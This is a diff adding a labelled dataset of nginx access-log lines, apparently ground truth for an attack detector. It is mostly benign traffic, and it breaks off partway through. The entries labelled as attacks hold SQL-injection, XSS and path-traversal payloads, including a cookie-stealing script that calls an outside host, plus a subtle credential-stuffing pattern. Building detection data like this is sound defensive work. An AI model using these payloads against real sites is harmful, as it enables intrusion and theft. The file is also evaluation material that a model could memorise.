@@ -1,0 +1,1698 @@
+[
+ {
+  "file": "nginx",
+  "idx": 0,
+  "line": "81.2.69.160 - - [24/May/2026:09:00:00 +0000] \"GET /blog/how-to-choose-running-shoes HTTP/1.1\" 200 15320 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 1,
+  "line": "172.16.4.9 - - [24/May/2026:09:00:07 +0000] \"GET /favicon.ico HTTP/1.1\" 200 1150 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 2,
+  "line": "172.16.4.9 - - [24/May/2026:09:00:14 +0000] \"GET /account/orders HTTP/1.1\" 200 2210 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 3,
+  "line": "10.0.0.5 - - [24/May/2026:09:00:21 +0000] \"GET /blog/how-to-choose-running-shoes HTTP/1.1\" 200 15320 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 4,
+  "line": "10.0.0.5 - - [24/May/2026:09:00:28 +0000] \"GET /search?q=blue+sneakers HTTP/1.1\" 200 6602 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 5,
+  "line": "172.16.4.9 - - [24/May/2026:09:00:35 +0000] \"GET /search?q=blue+sneakers HTTP/1.1\" 200 6602 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 6,
+  "line": "66.249.66.1 - - [24/May/2026:09:01:42 +0000] \"GET / HTTP/1.1\" 200 5120 \"-\" \"Googlebot/2.1 (+http://www.google.com/bot.html)\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 7,
+  "line": "81.2.69.160 - - [24/May/2026:09:01:49 +0000] \"GET /blog/how-to-choose-running-shoes HTTP/1.1\" 200 15320 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 8,
+  "line": "10.0.0.12 - - [24/May/2026:09:01:56 +0000] \"POST /api/login HTTP/1.1\" 200 312 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 9,
+  "line": "24.48.0.1 - - [24/May/2026:09:01:03 +0000] \"GET /favicon.ico HTTP/1.1\" 200 1150 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 10,
+  "line": "66.249.66.1 - - [24/May/2026:09:01:10 +0000] \"POST /api/checkout HTTP/1.1\" 201 640 \"-\" \"Googlebot/2.1 (+http://www.google.com/bot.html)\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 11,
+  "line": "81.2.69.160 - - [24/May/2026:09:01:17 +0000] \"POST /api/cart HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 12,
+  "line": "81.2.69.160 - - [24/May/2026:09:02:24 +0000] \"GET /missing-page HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 13,
+  "line": "172.16.4.9 - - [24/May/2026:09:02:31 +0000] \"GET /products/42 HTTP/1.1\" 200 3310 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 14,
+  "line": "24.48.0.1 - - [24/May/2026:09:02:38 +0000] \"GET / HTTP/1.1\" 200 5120 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 15,
+  "line": "10.0.0.5 - - [24/May/2026:09:02:45 +0000] \"POST /api/cart HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 16,
+  "line": "172.16.4.9 - - [24/May/2026:09:02:52 +0000] \"POST /api/cart HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 17,
+  "line": "66.249.66.1 - - [24/May/2026:09:02:59 +0000] \"GET / HTTP/1.1\" 200 5120 \"-\" \"Googlebot/2.1 (+http://www.google.com/bot.html)\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 18,
+  "line": "172.16.4.9 - - [24/May/2026:09:03:06 +0000] \"GET /favicon.ico HTTP/1.1\" 200 1150 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 19,
+  "line": "66.249.66.1 - - [24/May/2026:09:03:13 +0000] \"GET /products HTTP/1.1\" 200 8421 \"-\" \"Googlebot/2.1 (+http://www.google.com/bot.html)\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 20,
+  "line": "66.249.66.1 - - [24/May/2026:09:03:20 +0000] \"GET /account/orders HTTP/1.1\" 200 2210 \"-\" \"Googlebot/2.1 (+http://www.google.com/bot.html)\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 21,
+  "line": "81.2.69.160 - - [24/May/2026:09:03:27 +0000] \"POST /api/cart HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 22,
+  "line": "81.2.69.160 - - [24/May/2026:09:03:34 +0000] \"GET /missing-page HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 23,
+  "line": "24.48.0.1 - - [24/May/2026:09:03:41 +0000] \"GET /products HTTP/1.1\" 200 8421 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 24,
+  "line": "10.0.0.5 - - [24/May/2026:09:04:48 +0000] \"POST /api/login HTTP/1.1\" 200 312 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 25,
+  "line": "24.48.0.1 - - [24/May/2026:09:04:55 +0000] \"GET /blog/how-to-choose-running-shoes HTTP/1.1\" 200 15320 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 26,
+  "line": "10.0.0.5 - - [24/May/2026:09:04:02 +0000] \"POST /api/checkout HTTP/1.1\" 201 640 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 27,
+  "line": "10.0.0.12 - - [24/May/2026:09:04:09 +0000] \"GET /products HTTP/1.1\" 200 8421 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 28,
+  "line": "10.0.0.12 - - [24/May/2026:09:04:16 +0000] \"GET /products/42 HTTP/1.1\" 200 3310 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 29,
+  "line": "10.0.0.5 - - [24/May/2026:09:04:23 +0000] \"POST /api/checkout HTTP/1.1\" 201 640 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 30,
+  "line": "192.168.1.20 - - [24/May/2026:09:05:30 +0000] \"GET /api/health HTTP/1.1\" 200 17 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 31,
+  "line": "192.168.1.20 - - [24/May/2026:09:05:37 +0000] \"GET /api/health HTTP/1.1\" 200 17 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 32,
+  "line": "24.48.0.1 - - [24/May/2026:09:05:44 +0000] \"GET /products HTTP/1.1\" 200 8421 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 33,
+  "line": "172.16.4.9 - - [24/May/2026:09:05:51 +0000] \"GET /blog/how-to-choose-running-shoes HTTP/1.1\" 200 15320 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 34,
+  "line": "192.168.1.20 - - [24/May/2026:09:05:58 +0000] \"POST /api/cart HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 35,
+  "line": "10.0.0.12 - - [24/May/2026:09:05:05 +0000] \"POST /api/cart HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 36,
+  "line": "172.16.4.9 - - [24/May/2026:09:06:12 +0000] \"GET /images/banner.jpg HTTP/1.1\" 304 0 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 37,
+  "line": "10.0.0.12 - - [24/May/2026:09:06:19 +0000] \"POST /api/checkout HTTP/1.1\" 201 640 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 38,
+  "line": "172.16.4.9 - - [24/May/2026:09:06:26 +0000] \"GET /favicon.ico HTTP/1.1\" 200 1150 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 39,
+  "line": "10.0.0.12 - - [24/May/2026:09:06:33 +0000] \"GET /api/health HTTP/1.1\" 200 17 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 40,
+  "line": "10.0.0.5 - - [24/May/2026:09:06:40 +0000] \"GET /favicon.ico HTTP/1.1\" 200 1150 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 41,
+  "line": "24.48.0.1 - - [24/May/2026:09:06:47 +0000] \"POST /api/cart HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 42,
+  "line": "66.249.66.1 - - [24/May/2026:09:07:54 +0000] \"GET /account/orders HTTP/1.1\" 200 2210 \"-\" \"Googlebot/2.1 (+http://www.google.com/bot.html)\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 43,
+  "line": "66.249.66.1 - - [24/May/2026:09:07:01 +0000] \"GET /favicon.ico HTTP/1.1\" 200 1150 \"-\" \"Googlebot/2.1 (+http://www.google.com/bot.html)\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 44,
+  "line": "66.249.66.1 - - [24/May/2026:09:07:08 +0000] \"GET /search?q=blue+sneakers HTTP/1.1\" 200 6602 \"-\" \"Googlebot/2.1 (+http://www.google.com/bot.html)\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 45,
+  "line": "10.0.0.12 - - [24/May/2026:09:07:15 +0000] \"GET /blog/how-to-choose-running-shoes HTTP/1.1\" 200 15320 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 46,
+  "line": "81.2.69.160 - - [24/May/2026:09:07:22 +0000] \"POST /api/login HTTP/1.1\" 200 312 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 47,
+  "line": "10.0.0.12 - - [24/May/2026:09:07:29 +0000] \"GET /search?q=blue+sneakers HTTP/1.1\" 200 6602 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 48,
+  "line": "172.16.4.9 - - [24/May/2026:09:08:36 +0000] \"GET /api/cart HTTP/1.1\" 200 812 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 49,
+  "line": "24.48.0.1 - - [24/May/2026:09:08:43 +0000] \"POST /api/login HTTP/1.1\" 200 312 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 50,
+  "line": "10.0.0.5 - - [24/May/2026:09:08:50 +0000] \"GET /favicon.ico HTTP/1.1\" 200 1150 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 51,
+  "line": "81.2.69.160 - - [24/May/2026:09:08:57 +0000] \"GET /images/banner.jpg HTTP/1.1\" 304 0 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 52,
+  "line": "10.0.0.5 - - [24/May/2026:09:08:04 +0000] \"GET /static/style.css HTTP/1.1\" 200 12004 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 53,
+  "line": "24.48.0.1 - - [24/May/2026:09:08:11 +0000] \"POST /api/cart HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 54,
+  "line": "24.48.0.1 - - [24/May/2026:09:09:18 +0000] \"GET /static/app.js HTTP/1.1\" 200 90211 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 55,
+  "line": "10.0.0.5 - - [24/May/2026:09:09:25 +0000] \"GET /account/orders HTTP/1.1\" 200 2210 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 56,
+  "line": "192.168.1.20 - - [24/May/2026:09:09:32 +0000] \"POST /api/cart HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 57,
+  "line": "81.2.69.160 - - [24/May/2026:09:09:39 +0000] \"POST /api/checkout HTTP/1.1\" 201 640 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 58,
+  "line": "81.2.69.160 - - [24/May/2026:09:09:46 +0000] \"GET /static/style.css HTTP/1.1\" 200 12004 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 59,
+  "line": "192.168.1.20 - - [24/May/2026:09:09:53 +0000] \"GET /images/banner.jpg HTTP/1.1\" 304 0 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 60,
+  "line": "10.0.0.12 - - [24/May/2026:09:11:00 +0000] \"GET /search?q=select+a+union+rep HTTP/1.1\" 200 2100 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 61,
+  "line": "10.0.0.12 - - [24/May/2026:09:11:05 +0000] \"GET /blog/sql-injection-prevention-guide HTTP/1.1\" 200 18000 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 62,
+  "line": "192.168.1.20 - - [24/May/2026:09:11:10 +0000] \"GET /api/export?format=csv&month=2026-05 HTTP/1.1\" 200 48211 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 63,
+  "line": "10.0.0.5 - - [24/May/2026:09:11:20 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Mobile/15E148\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 64,
+  "line": "38.142.10.7 - - [24/May/2026:09:20:01 +0000] \"GET /item?id=5%27%20UNION%20SELECT%20null,version()-- HTTP/1.1\" 500 312 \"-\" \"sqlmap/1.8#stable\"",
+  "label": "attack",
+  "attack": "SQLI",
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 65,
+  "line": "38.142.10.7 - - [24/May/2026:09:20:03 +0000] \"GET /login?user=admin%27%20OR%201=1--&pw=x HTTP/1.1\" 500 312 \"-\" \"sqlmap/1.8#stable\"",
+  "label": "attack",
+  "attack": "SQLI",
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 66,
+  "line": "38.142.10.7 - - [24/May/2026:09:20:05 +0000] \"GET /api/report?id=1;DROP%20TABLE%20orders HTTP/1.1\" 500 312 \"-\" \"sqlmap/1.8#stable\"",
+  "label": "attack",
+  "attack": "SQLI",
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 67,
+  "line": "91.121.40.3 - - [24/May/2026:09:21:01 +0000] \"GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1\" 400 200 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "attack",
+  "attack": "XSS",
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 68,
+  "line": "91.121.40.3 - - [24/May/2026:09:21:04 +0000] \"GET /profile?bio=<svg/onload=fetch('//x.ru/'+document.cookie)> HTTP/1.1\" 400 200 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "attack",
+  "attack": "XSS",
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 69,
+  "line": "91.121.40.3 - - [24/May/2026:09:21:07 +0000] \"GET /r?next=javascript:alert(1) HTTP/1.1\" 400 200 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+  "label": "attack",
+  "attack": "XSS",
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 70,
+  "line": "103.77.2.19 - - [24/May/2026:09:22:01 +0000] \"GET /download?f=../../../../etc/passwd HTTP/1.1\" 403 128 \"-\" \"curl/8.4.0\"",
+  "label": "attack",
+  "attack": "PATH_TRAVERSAL",
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 71,
+  "line": "103.77.2.19 - - [24/May/2026:09:22:03 +0000] \"GET /img?path=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1\" 403 128 \"-\" \"curl/8.4.0\"",
+  "label": "attack",
+  "attack": "PATH_TRAVERSAL",
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 72,
+  "line": "103.77.2.19 - - [24/May/2026:09:22:05 +0000] \"GET /static/..\\..\\..\\windows\\win.ini HTTP/1.1\" 403 128 \"-\" \"curl/8.4.0\"",
+  "label": "attack",
+  "attack": "PATH_TRAVERSAL",
+  "subtle": false
+ },
+ {
+  "file": "nginx",
+  "idx": 73,
+  "line": "185.199.10.11 - - [24/May/2026:09:25:00 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 74,
+  "line": "185.199.10.11 - - [24/May/2026:09:26:29 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 75,
+  "line": "185.199.10.23 - - [24/May/2026:09:29:13 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 76,
+  "line": "185.199.10.37 - - [24/May/2026:09:33:26 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 77,
+  "line": "185.199.10.37 - - [24/May/2026:09:34:55 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 78,
+  "line": "185.199.10.41 - - [24/May/2026:09:37:39 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 79,
+  "line": "185.199.10.58 - - [24/May/2026:09:41:52 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 80,
+  "line": "185.199.10.58 - - [24/May/2026:09:42:21 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 81,
+  "line": "45.155.205.7 - - [24/May/2026:09:45:05 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 82,
+  "line": "45.155.205.19 - - [24/May/2026:09:49:18 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 83,
+  "line": "45.155.205.19 - - [24/May/2026:09:50:47 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 84,
+  "line": "45.155.205.88 - - [24/May/2026:09:53:31 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "nginx",
+  "idx": 85,
